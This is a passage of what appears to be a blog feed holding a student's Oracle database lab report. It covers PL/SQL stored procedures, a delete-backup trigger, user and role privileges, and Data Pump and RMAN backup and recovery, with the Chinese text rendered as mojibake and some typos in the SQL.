class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> change_phone</span><br><span class="line">(</span><br><span class="line">    Read_ID <span class="keyword">in</span> <span class="type">char</span>,</span><br><span class="line">    Read_name <span class="keyword">in</span> varchar2,</span><br><span class="line">    read_tel <span class="keyword">in</span> varchar2,</span><br><span class="line">    new_tel <span class="keyword">in</span> varchar2,</span><br><span class="line">    status_code <span class="keyword">out</span> number,</span><br><span class="line">    status_text <span class="keyword">out</span> varchar2</span><br><span class="line">)</span><br><span class="line"><span class="keyword">is</span></span><br><span class="line">    readid <span class="type">char</span>(<span class="number">18</span>) :<span class="operator">=</span> Read_ID;</span><br><span class="line">    readname varchar2(<span class="number">20</span>) :<span class="operator">=</span> Read_name;</span><br><span class="line">    readtel varchar2(<span class="number">11</span>) :<span class="operator">=</span> read_tel;</span><br><span class="line">    newtel varchar2(<span class="number">11</span>) :<span class="operator">=</span> new_tel;</span><br><span class="line">    tempreadname varchar2(<span class="number">20</span>);</span><br><span class="line">    tempreadtel varchar2(<span class="number">11</span>);</span><br><span class="line">    err_readname exception;</span><br><span class="line">    err_readtel exception;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    status_code :<span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    status_text :<span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;   <span class="comment">-- åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> reader_name, reader_tel <span class="keyword">into</span> tempreadname, tempreadtel <span class="keyword">from</span> reader <span class="keyword">where</span> reader_id <span class="operator">=</span> readid;</span><br><span class="line"></span><br><span class="line">    if readname <span class="operator">&lt;&gt;</span> tempreadname <span class="keyword">then</span>    <span class="comment">-- åˆ¤æ–­è¾“å…¥çš„è¯»è€…å§“åæ˜¯å¦æ­£ç¡®</span></span><br><span class="line">        raise err_readname;</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">    if readtel <span class="operator">&lt;&gt;</span> tempreadtel <span class="keyword">then</span>      <span class="comment">-- åˆ¤æ–­è¾“å…¥çš„ç”µè¯å·ç æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">        raise err_readtel;</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">update</span> reader <span class="keyword">set</span> reader_tel <span class="operator">=</span> newtel <span class="keyword">where</span> reader_id <span class="operator">=</span> readid; <span class="comment">-- æ›´æ–°ç”µè¯å·ç </span></span><br><span class="line">    <span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line">exception</span><br><span class="line">    <span class="keyword">WHEN</span> NO_DATA_FOUND <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;è¯»è€…ä¿¡æ¯ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> err_readname <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;è¯»è€…å§“åé”™è¯¯&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> err_readtel <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;ç”µè¯å·ç é”™è¯¯&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> OTHERS <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> substr(SQLERRM, <span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">end</span> change_phone;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114024232565.png" alt="image-20231114024232565" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114024604385.png" alt="image-20231114024604385" style="zoom:50%;" /><p>è¿è¡ŒæˆåŠŸã€‚</p><h5 id="å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€‚"><a href="#å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€‚" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€‚"></a>å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€‚</h5><p>å¯ä»¥åœ¨æ•°æ®å­—å…¸USER_OBJECTSä¸­æŸ¥çœ‹è¯¥å­˜å‚¨è¿‡ç¨‹çš„åŸºæœ¬ä¿¡æ¯ã€‚</p><p>SQLè¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Object_name,object_type,created,status <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_type <span class="operator">=</span> <span class="string">&#x27;procedure&#x27;</span> <span class="keyword">and</span> object_name <span class="operator">=</span> <span class="string">&#x27;change_phone&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç»“æœæˆªå›¾ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114025340146.png" alt="image-20231114025340146" style="zoom: 33%;" /><p>è¿˜å¯ä»¥ç¼–å†™SQLç¨‹åºï¼Œåœ¨æ•°æ®å­—å…¸USER_OBJECTSä¸­æ‰§è¡Œï¼Œå¯¹è¯¥å­˜å‚¨è¿‡ç¨‹è¿›è¡Œä»£ç ä¿¡æ¯çš„æŸ¥è¯¢ï¼ŒæŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹ä»£ç ä¿¡æ¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_source <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;STANDARD&#x27;</span> <span class="keyword">and</span> type <span class="operator">=</span> <span class="string">&#x27;PACKAGE&#x27;</span>;  <span class="comment">--é€‰æ‹©äº†å¦ä¸€æ®µä»£ç æŸ¥çœ‹</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114031737209.png" alt="image-20231114031737209" style="zoom: 33%;" /><h5 id="å­˜å‚¨è¿‡ç¨‹ä½¿ç”¨"><a href="#å­˜å‚¨è¿‡ç¨‹ä½¿ç”¨" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹ä½¿ç”¨"></a>å­˜å‚¨è¿‡ç¨‹ä½¿ç”¨</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">decleare</span><br><span class="line">    status number;</span><br><span class="line">    status_text varchar2(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    change_phone(<span class="string">&#x27;201601010101&#x27;</span>, <span class="string">&#x27;å¼ ä¸‰&#x27;</span>, <span class="string">&#x27;12345678901&#x27;</span>, <span class="string">&#x27;12345678901&#x27;</span>, status, status_text);</span><br><span class="line">    IF status <span class="operator">&lt;&gt;</span> <span class="number">0</span> <span class="keyword">THEN</span></span><br><span class="line">        dbms_output.put_line(status_text);</span><br><span class="line">    <span class="keyword">ELSE</span></span><br><span class="line">    dbms_output.put_line(<span class="string">&#x27;ok!&#x27;</span>);</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114032228911.png" alt="image-20231114032228911" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114032437633.png" alt="image-20231114032437633" style="zoom:33%;" /><h5 id="å­˜å‚¨è¿‡ç¨‹åˆ é™¤"><a href="#å­˜å‚¨è¿‡ç¨‹åˆ é™¤" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹åˆ é™¤"></a>å­˜å‚¨è¿‡ç¨‹åˆ é™¤</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> change_phone;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œè¯¥SQLè¯­å¥åï¼Œchange_phoneå­˜å‚¨è¿‡ç¨‹ä»æ•°æ®åº“ä¸­è¢«åˆ é™¤ã€‚</p><h4 id="è§¦å‘å™¨ç¼–ç¨‹"><a href="#è§¦å‘å™¨ç¼–ç¨‹" class="headerlink" title="è§¦å‘å™¨ç¼–ç¨‹"></a>è§¦å‘å™¨ç¼–ç¨‹</h4><h5 id="è§¦å‘å™¨åˆ›å»ºåŠç¼–è¯‘"><a href="#è§¦å‘å™¨åˆ›å»ºåŠç¼–è¯‘" class="headerlink" title="è§¦å‘å™¨åˆ›å»ºåŠç¼–è¯‘"></a>è§¦å‘å™¨åˆ›å»ºåŠç¼–è¯‘</h5><p>è€ƒè™‘åˆ°æ•°æ®çš„å®‰å…¨æ€§ï¼Œåœ¨READERè¡¨ä¸­ç¼–ç¨‹åˆ›å»ºä¸€ä¸ªåˆ é™¤è§¦å‘å™¨ï¼ˆT_READER_DELï¼‰ã€‚è¯¥è§¦å‘å™¨å°†æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼šå½“READERè¡¨çš„ä»»ä¸€è¡Œå°†è¢«åˆ é™¤æ—¶ï¼Œè§¦å‘å™¨å°±ä¼šæŠŠè¯¥è¡Œæ•°æ®è®°å½•ä¿å­˜åœ¨è¯»è€…ä¿¡æ¯åˆ é™¤å¤‡ä»½è¡¨ï¼ˆREADER_DEL_BAKï¼‰ä¸­ï¼Œå¹¶ä¸”åœ¨è¯¥å¤‡ä»½è¡¨ä¸­è®°å½•å¯¹READERè¡¨åšåˆ é™¤æ“ä½œçš„ç”¨æˆ·å’Œåˆ é™¤æ“ä½œçš„æ—¶é—´ã€‚</p><p>é¦–å…ˆåˆ›å»ºå€Ÿé˜…è€…ä¿¡æ¯åˆ é™¤å¤‡ä»½è¡¨reader_del_bak</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> reader_del_bak (</span><br><span class="line">    Read_ID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    read_name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    read_addr <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">null</span>,</span><br><span class="line">    read_tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">null</span>,</span><br><span class="line">    Del_ID <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">null</span>,</span><br><span class="line">    Del_date <span class="type">DATE</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å¹¶åˆ›å»ºåä¸ºT_READER_DELçš„è§¦å‘å™¨ã€‚</p><blockquote><p> æ³¨æ„è¿™é‡Œä¸€å®šè¦ç”¨library_dbaå»æ“ä½œï¼Œä¹Ÿå°±æ˜¯normalå¯¹è±¡åˆ›å»ºè§¦å‘å™¨ã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">TRIGGER</span> T_READER_DEl</span><br><span class="line">after <span class="keyword">delete</span> <span class="keyword">on</span> reader</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span>   </span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> Reader_Del_Bak <span class="keyword">values</span></span><br><span class="line">    (:old.read_ID,</span><br><span class="line">    :old.read_name,</span><br><span class="line">    :old.read_addr,</span><br><span class="line">    :old.read_tel,</span><br><span class="line">    <span class="keyword">user</span>,</span><br><span class="line">    sysdate</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">commit</span>;</span><br><span class="line">exception</span><br><span class="line">    <span class="keyword">when</span> others <span class="keyword">then</span></span><br><span class="line">        dbms_output.put_line(<span class="string">&#x27;error = &#x27;</span><span class="operator">||</span>to_char(sqlcode));</span><br><span class="line">        dbms_output.put_line(<span class="string">&#x27;error message = &#x27;</span><span class="operator">||</span>sqlerrm);</span><br><span class="line"><span class="keyword">end</span> T_READER_DEl;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114034159301.png" alt="image-20231114034159301" style="zoom:50%;" /><h5 id="æŸ¥è¯¢è§¦å‘å™¨"><a href="#æŸ¥è¯¢è§¦å‘å™¨" class="headerlink" title="æŸ¥è¯¢è§¦å‘å™¨"></a>æŸ¥è¯¢è§¦å‘å™¨</h5><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> object_name,object_type,created,status <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_type <span class="operator">=</span> <span class="string">&#x27;TRIGGER&#x27;</span> <span class="keyword">and</span> object_name <span class="operator">=</span> <span class="string">&#x27;DBMS_SET_PDB&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114035257187.png" alt="image-20231114035257187" style="zoom:33%;" /><h5 id="ä½¿ç”¨è§¦å‘å™¨"><a href="#ä½¿ç”¨è§¦å‘å™¨" class="headerlink" title="ä½¿ç”¨è§¦å‘å™¨"></a>ä½¿ç”¨è§¦å‘å™¨</h5><p>dd</p><h5 id="åˆ é™¤è§¦å‘å™¨"><a href="#åˆ é™¤è§¦å‘å™¨" class="headerlink" title="åˆ é™¤è§¦å‘å™¨"></a>åˆ é™¤è§¦å‘å™¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop TRIGGER T_READER_DEL;</span><br></pre></td></tr></table></figure><h2 id="å®éªŒå››ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracleæ•°æ®åº“ç³»ç»Ÿç®¡ç†"><a href="#å®éªŒå››ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracleæ•°æ®åº“ç³»ç»Ÿç®¡ç†" class="headerlink" title="å®éªŒå››ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracleæ•°æ®åº“ç³»ç»Ÿç®¡ç†"></a><strong>å®éªŒå››ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracleæ•°æ®åº“ç³»ç»Ÿç®¡ç†</strong></h2><h3 id="å®éªŒåŸç†-3"><a href="#å®éªŒåŸç†-3" class="headerlink" title="å®éªŒåŸç†"></a>å®éªŒåŸç†</h3><p>ä½¿ç”¨Oracle SQL Developeræˆ–SQL Plusæ•°æ®åº“å·¥å…·å¯¹å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿæ•°æ®åº“è¿›è¡Œç³»ç»Ÿä¸­çš„ç”¨æˆ·å¯¹ç‰¹å®šæ•°æ®åº“çš„æƒé™çš„ç®¡ç†ï¼Œä»¥åŠä½¿ç”¨æ•°æ®æ³µå·¥å…·ç¨‹åºå®Œæˆæ•°æ®åº“å¤‡ä»½æˆ–æ¢å¤æ“ä½œã€‚</p><h3 id="å®éªŒæ­¥éª¤-3"><a href="#å®éªŒæ­¥éª¤-3" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><ul><li>åœ¨å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿæ•°æ®åº“Libä¸­ï¼Œç¼–å†™è¿è¡ŒSQLè¯­å¥å®ç°â€œè¯»è€…ï¼ˆR_LIB_READERï¼‰â€è§’è‰²åˆ›å»ºã€‚</li><li>é’ˆå¯¹â€œè¯»è€…ï¼ˆR_LIB_READERï¼‰â€è§’è‰²ï¼Œç¼–å†™è¿è¡ŒSQLç¨‹åºèµ‹äºˆå…¶ç›¸åº”çš„ç³»ç»Ÿæƒé™ä¸æ•°æ®åº“å¯¹è±¡è®¿é—®æƒé™ï¼Œè¦æ±‚æœ€å°èŒƒå›´åœ°èµ‹äºˆå…¶ç›¸åº”çš„ç³»ç»Ÿæƒé™ï¼Œå¹¶åˆç†åœ°èµ‹äºˆå…¶å¯¹READERè¡¨ã€BOOKè¡¨ã€RESERVEè¡¨è®¿é—®æƒé™ã€‚</li><li>ç¼–å†™è¿è¡Œæ¦‚è¦æ–‡ä»¶LIB_READER_PROFåˆ›å»ºSQLè¯­å¥ï¼Œå®ç°æ•°æ®åº“ç”¨æˆ·çš„èµ„æºè®¿é—®å’Œå£ä»¤æ“ä½œé™åˆ¶ã€‚</li><li>ç¼–å†™è¿è¡Œåˆ›å»ºè¯»è€…ç”¨æˆ·U_LIB_READERçš„SQLè¯­å¥ï¼Œå¹¶åˆ†æ´¾è§’è‰²R_LIB_READERå’Œæ¦‚è¦æ–‡ä»¶LIB_READER_PROFã€‚</li><li>åœ¨ä»¥ä¸Šç”¨æˆ·æƒé™åŸºç¡€ä¸Šï¼Œå†ç¼–å†™è¿è¡ŒSQLè¯­å¥å®ç°U_LIB_READERç”¨æˆ·è¢«èµ‹äºˆè®¿é—®TITLEè¡¨å¯¹è±¡çš„SELECTæƒé™ã€‚</li><li>U_LIB_READERç”¨æˆ·ç™»å½•è¿æ¥Libæ•°æ®åº“ï¼Œç¼–å†™è¿è¡ŒSQLè¯­å¥éªŒè¯U_LIB_READERç”¨æˆ·å¯¹READERè¡¨ã€BOOKè¡¨ã€RESERVEè¡¨çš„å¢ã€åˆ ã€æŸ¥æ”¹è®¿é—®æƒé™ã€‚</li><li>ä»¥SYSç”¨æˆ·ï¼Œç¼–å†™è¿è¡ŒSQLè¯­å¥æŸ¥çœ‹æ‰€åˆ›å»ºçš„ç”¨æˆ·ã€æ¦‚è¦æ–‡ä»¶å’Œè§’è‰²å¯¹è±¡å…ƒæ•°æ®ã€‚</li><li>ä½¿ç”¨æ•°æ®æ³µå·¥å…·æ–¹æ³•å®ç°Libæ•°æ®åº“é€»è¾‘å¤‡ä»½ã€‚</li><li>å¯¹Libæ•°æ®åº“ä¸­æŸå¯¹è±¡è¿›è¡Œåˆ é™¤ç ´åï¼Œç„¶åä½¿ç”¨æ•°æ®æ³µå·¥å…·æ–¹æ³•å®ç°Libæ•°æ®åº“é€»è¾‘æ¢å¤ã€‚</li></ul><blockquote><p>ç‰¹åˆ«è¦æ±‚ï¼šLibæ•°æ®åº“ä¸­å„ä¸ªå¯¹è±¡åç§°éƒ½éœ€è¦æ·»åŠ æœ¬äººå­¦å·ä½œä¸ºåç¼€ï¼Œå¦‚â€œR_LIB_READER_20220348021â€æ ¼å¼ã€‚</p></blockquote><h3 id="å®éªŒè¿‡ç¨‹-3"><a href="#å®éªŒè¿‡ç¨‹-3" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h3><h4 id="ç”¨æˆ·æƒé™ç®¡ç†"><a href="#ç”¨æˆ·æƒé™ç®¡ç†" class="headerlink" title="ç”¨æˆ·æƒé™ç®¡ç†"></a>ç”¨æˆ·æƒé™ç®¡ç†</h4><blockquote><p>ç”¨æˆ·ã€æ¦‚è¦æ–‡ä»¶å’Œè§’è‰²çš„åˆ›å»º</p></blockquote><p>ç”±äºLIBRARY_DBAç”¨æ··å…·æœ‰DBAæƒé™ï¼Œä¸ä»¥æä¾›ç»™æ™®é€šä½¿ç”¨è€…è®¿é—®æ•°æ®åº“ï¼Œå› æ­¤éœ€è¦ä¸ºæ™®é€šä½¿ç”¨è¿™ç§åˆ›å»ºç‰¹å®šçš„ç”¨æˆ·ï¼Œè¿™é‡Œæ–°åˆ›å»ºä¸€ä¸ªåä¸ºU_LIB_READER_2022090914031çš„ç”¨æˆ·ï¼Œå°†æ¥å¯ä»¥ä½¿ç”¨æ”¹ç”¨æˆ·ç™»å½•å¹¶æŸ¥çœ‹LIBRARY_DBAæ–¹æ¡ˆä¸‹çš„READERè¡¨ã€‚</p><ul><li>åœ¨å·¥å…·ä¸­é€‰æ‹©å…¶ä»–ç”¨æˆ·ç›®å½•å¹¶ç‚¹å‡»ï¼Œé€‰æ‹©æ·»åŠ ç”¨æˆ·</li></ul><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203145145833.png" alt="image-20231203145145833" style="zoom:50%;" /><p>æ³¨ï¼šNavicatåˆ›å»ºç”¨æˆ·å¯¹ç”¨æˆ·åæœ‰é™åˆ¶ï¼Œè¿™é‡Œåˆ›å»º<code>C##U_LIB_READER_2022090914031</code>ç”¨æˆ·</p><ul><li>å¯¹æ–°åˆ›å»ºçš„ç”¨æˆ·è¦è®¾ç½®ç‰¹å®šçš„èµ„æºè®¿é—®é™åˆ¶ï¼Œå› æ­¤éœ€è¦æ–°åˆ›å»ºä¸€ä¸ªåä¸ºC##LIB_READER_PROFçš„æ¦‚è¦æ–‡ä»¶ã€‚ç”±äºnavicatå¹¶æ²¡æœ‰åˆ›å»ºæ¦‚è¦æ–‡ä»¶çš„GUIç•Œé¢ï¼Œæ•…é‡‡ç”¨SQLè¯­å¥æ¥åˆ›å»ºã€‚</li></ul><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203151127455.png" alt="image-20231203151127455" style="zoom:50%;" /><ul><li>å¯¹æ–°åˆ›å»ºçš„ç”¨æˆ·è¦è®¾ç½®ç‰¹å®šçš„æƒé™ï¼Œå¯ä»¥é€šè¿‡è§‰å¾—çš„æ–¹å¼æ¥èµ‹äºˆæƒé™ï¼Œå› æ­¤æ–°åˆ›å»ºä¸€ä¸ªåä¸ºR_LIB_READER_2022090914031çš„è§’è‰²</li></ul><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203150502495.png" alt="image-20231203150502495" style="zoom:50%;" /><blockquote><p>åˆ†é…æ¦‚è¦æ–‡ä»¶å’Œæƒé™çš„èµ‹äºˆä¸å›æ”¶</p></blockquote><ul><li>æŠŠC##LIB_READER_PROFæ¦‚è¦æ–‡ä»¶èµ‹äºˆU_LIB_READER_2022090914031ç”¨æˆ·ï¼Œå¹¶ä½¿èµ„æºç”Ÿæ•ˆ</li></ul><p><code>ALTER USER C##U_LIB_READER_2022090914031 PROFILE C##LIB_READER_PROF;</code></p><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203151528345.png" alt="image-20231203151528345" style="zoom: 33%;" /><p>ä¿®æ”¹åŠ¨æ€å‚æ•° RESOURCE_LIMITä¸ºTRUEçš„SQLè¯­å¥å¦‚ä¸‹</p><p><code>ALTER SYSTEM SET RESOURCE_LIMIT = TRUE</code></p><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203151643147.png" alt="image-20231203151643147" style="zoom:33%;" /><blockquote><p>åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·ã€æ¦‚è¦æ–‡ä»¶å’Œè§’è‰²</p></blockquote><p>åˆ é™¤ç”¨æˆ·C##U_LIB_READER_2022090914031,profileå’Œpole</p><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203152205493.png" alt="image-20231203152205493" style="zoom:50%;" /><h4 id="æ•°æ®åº“å¤‡ä»½ä¸æ¢å¤"><a href="#æ•°æ®åº“å¤‡ä»½ä¸æ¢å¤" class="headerlink" title="æ•°æ®åº“å¤‡ä»½ä¸æ¢å¤"></a>æ•°æ®åº“å¤‡ä»½ä¸æ¢å¤</h4><p>åº”å¯¹æ•°æ®åº“å®‰å…¨ç‰©ç†å¨èƒï¼Œé˜²èŒƒæ•°æ®ä¸¢å¤±æˆ–æŸåçš„ä¸»è¦è§£å†³æ–¹æ¡ˆæ˜¯æ•°æ®å¤‡ä»½ä¸æ¢å¤æŠ€æœ¯ã€‚å¯ä»¥ä½¿ç”¨æ•°æ®æ³µçš„å¯¼å‡ºå¯¼å…¥åŠŸèƒ½å®ç°å¯¹æ•°æ®çš„é€»è¾‘å¤‡ä»½ï¼Œæˆ–ä½¿ç”¨RMANçš„è‡ªåŠ¨å¤‡ä»½æŠ€æœ¯å®ç°å¯¹æ•°æ®çš„ç‰©ç†å¤‡ä»½ã€‚</p><blockquote><p>æ•°æ®æ³µå¤‡ä»½ä¸æ¢å¤</p></blockquote><p>ç›´æ¥ç‚¹å‡»navicatä¸Šæ–¹å¯¼èˆªæ ä¸­çš„æ•°æ®æ³µï¼Œé€‰æ‹©æ•°æ®æ³µå¯¼å‡ºï¼Œå³å¯</p><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203152747839.png" alt="image-20231203152747839" style="zoom: 33%;" /><p>ç‚¹å‡»è¿è¡Œï¼Œå°±å¼€å§‹å¯¼å‡ºå¤‡ä»½ã€‚</p><p>å¤‡ä»½ç»“æŸåï¼Œåˆ é™¤READERè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œç„¶åè¿›è¡ŒLIBRARY_DBAæ–¹æ¡ˆçš„å¯¼å…¥æ“ä½œã€‚</p><p>å¯¼å…¥æ­¥éª¤ä¸å¯¼å‡ºç›¸åŒã€‚</p><blockquote><p>RMANå¤‡ä»½ä¸æ¢å¤</p></blockquote><ul><li>å¤‡ä»½å‡†å¤‡ã€‚é¦–å…ˆä½¿ç”¨ARCHIVE LOG LISTå‘½ä»¤æŸ¥çœ‹å½“å‰æ•°æ®åº“ï¼Œå·²ç¡®è®¤å½“å‰å¤„äºå½’æ¡£æ¨¡å¼ã€‚</li></ul><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231203153528783.png" alt="image-20231203153528783" style="zoom: 33%;" /><ul><li>ç™»å½•RMANï¼Œä½¿ç”¨RMANå¤‡ä»½æ•°æ®æ–‡ä»¶</li></ul><p><code>backup datafile 1;</code></p><ul><li>ç”¨RMANæ¢å¤æ•°æ®æ–‡ä»¶çš„æ“ä½œ</li></ul><p>ç™»å½•RMANï¼Œå°†è¦æ¢å¤çš„å›æº¯å±€æ–‡ä»¶è„±æœºï¼Œ</p><p><code>sql &#39;ALTER DATABASEDATAFILE 6 OFFLINE;</code></p><p>é‡å»ºæ•°æ®æ–‡ä»¶</p><p><code>RESTORE DATAFILE 6;</code></p><p>æ¢å¤æ•°æ®æ–‡ä»¶</p><p><code>RECOVER DATAFILE 6;</code></p><p>ä½¿æ•°æ®æ–‡ä»¶è”æœº</p><p><code>sql â€™ALTERDATABASEDATAFILE6 OUTLINE;</code></p>]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oracle </tag>
            
            <tag> è¯¾å†… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023å¹´åº¦</title>
      <link href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6/"/>
      <url>/2024/01/01/2023%E5%B9%B4%E5%BA%A6/</url>
      
